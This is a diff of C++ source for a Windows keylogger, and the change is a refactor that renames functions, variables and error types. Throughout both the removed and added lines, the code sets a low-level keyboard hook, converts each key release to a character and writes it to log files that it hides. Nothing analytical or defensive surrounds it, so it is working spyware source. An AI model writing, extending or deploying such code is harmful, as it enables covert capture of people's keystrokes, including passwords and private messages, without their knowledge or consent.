@@ -8,16 +8,13 @@
 
 using namespace std;
 
-#define KEYLOGGER_FILE_NAME ".keyslog"
-#define KEYLOGGER_DEBUG_FILE_NAME ".debuglog"
+static KeyListener *key_listener_main_logger_g = NULL;
 
-static KeyListener *g_cMainListener = NULL;
-
-eKLoggerStatus initKLogger(string &sKLogPath)
+KLOGGER_error_codes_t KLOGGER_init_klogger(string &dir_to_save_logs)
 {
-    eKLoggerStatus rc = UNDEFINED;
-    if (NULL == g_cMainListener) {
-        g_cMainListener = new KeyListener(sKLogPath);
+    KLOGGER_error_codes_t rc = UNDEFINED;
+    if (NULL == key_listener_main_logger_g) {
+        key_listener_main_logger_g = new KeyListener(dir_to_save_logs);
         rc = SUCCESS;
         goto Exit;
     }
@@ -27,22 +24,22 @@ Exit:
     return rc;
 }
 
-eKLoggerStatus beginLogging(void)
+KLOGGER_error_codes_t KLOGGER_begin_logging(void)
 {
-    eKLoggerStatus rc = UNDEFINED;
-    HHOOK keyboardHookHandler;
-    HINSTANCE hInstance = GetModuleHandle(NULL);
+    KLOGGER_error_codes_t rc = UNDEFINED;
+    HHOOK keyboard_hook_handler;
+    HINSTANCE current_module_handler = GetModuleHandle(NULL);
     MSG message;
 
-    if (NULL == g_cMainListener) {
+    if (NULL == key_listener_main_logger_g) {
         rc = ERROR_BEGIN_LOGGING_CALLED_BEFORE_INIT;
         goto Exit;
     }
 
-    keyboardHookHandler = SetWindowsHookEx(
+    keyboard_hook_handler = SetWindowsHookEx(
         WH_KEYBOARD_LL,
-        fnKeyListenerPressCallbackProc,
-        hInstance,
+        key_listener_press_callback_procedure,
+        current_module_handler,
         0
         );
 
@@ -51,31 +48,30 @@ eKLoggerStatus beginLogging(void)
         DispatchMessage(&message);
     }
 
-    UnhookWindowsHookEx(keyboardHookHandler);
+    UnhookWindowsHookEx(keyboard_hook_handler);
 
     rc = SUCCESS;
 Exit:
     return rc;
 }
 
-static LRESULT CALLBACK fnKeyListenerPressCallbackProc (
+static LRESULT CALLBACK key_listener_press_callback_procedure (
     int nCode,
     WPARAM wParam,
     LPARAM lParam
 )
 {
-    g_cMainListener->fnPressCallback(nCode, wParam, lParam);
+    key_listener_main_logger_g->fnPressCallback(nCode, wParam, lParam);
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 KeyListener::KeyListener (
-	string &sKLogPath
-	) : m_KeyLogger{sKLogPath, KEYLOGGER_FILE_NAME},
-		m_DebugLogger{sKLogPath, KEYLOGGER_DEBUG_FILE_NAME},
-        m_baKeysPressed{0}
+	string &dir_to_save_logs
+	) : key_logger{dir_to_save_logs, KEYLOGGER_FILE_NAME},
+		debug_logger{dir_to_save_logs, KEYLOGGER_DEBUG_FILE_NAME}
 {
-    this->m_KeyLogger.hide();
-    this->m_DebugLogger.hide();
+    this->key_logger.hide();
+    this->debug_logger.hide();
 }
 
 void KeyListener::fnPressCallback (
@@ -84,21 +80,21 @@ void KeyListener::fnPressCallback (
     LPARAM lParam
 )
 {
-    KBDLLHOOKSTRUCT *sKeyboardStruct = (KBDLLHOOKSTRUCT *) lParam;
-    eLoggerStatus log_rc = LOGGER_UNDEFINED;
-    char currentChar = 0;
-    BYTE lpKeyState[256] = {0};
+    KBDLLHOOKSTRUCT *keyboard_settings = (KBDLLHOOKSTRUCT *) lParam;
+    LOGGER_Status_t log_rc = LOGGER_UNDEFINED;
+    CHAR current_char = 0;
+    BYTE keyboard_state[256] = {0};
 
-    GetKeyboardState(lpKeyState);
+    GetKeyboardState(keyboard_state);
 
     switch (wParam) {
         case WM_KEYUP:
-            ToAscii(sKeyboardStruct->vkCode,
-                    sKeyboardStruct->scanCode,
-                    lpKeyState,
-                    (LPWORD)&currentChar,
+            ToAscii(keyboard_settings->vkCode,
+                    keyboard_settings->scanCode,
+                    keyboard_state,
+                    (LPWORD)&current_char,
                     0);
-            log_rc = m_KeyLogger.logLine(&currentChar, 1);
+            log_rc = key_logger.LOGGER_log_line(&current_char, 1);
             if (LOGGER_SUCCESS != log_rc) {
                 cout << "Failed to log with error: " << log_rc << endl;
                 exit(log_rc);
